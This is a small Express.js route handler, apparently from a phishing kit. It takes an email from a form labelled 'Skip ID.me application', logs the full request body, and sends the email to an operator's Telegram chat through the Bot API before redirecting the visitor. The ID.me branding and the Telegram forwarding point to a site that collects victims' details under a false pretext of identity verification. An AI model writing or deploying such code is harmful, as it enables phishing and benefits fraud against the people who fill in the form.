const express = require('express');
const router = express.Router();
const axios = require('axios');

router.post('/', async (req, res) => {
  try {
    const email = req.body.email || '';
    // Debug: log received body to terminal
    console.log('Skip ID.me submission:', req.body);
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const text = `Application submitted via SKIP ID.me:\nEmail: ${email}\n(Date: ${new Date().toLocaleString()})`;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text
    });

    res.redirect('/submit');
  } catch (err) {
    console.error(err);
    res.status(500).send('Error processing skipped application.');
  }
});

module.exports = router;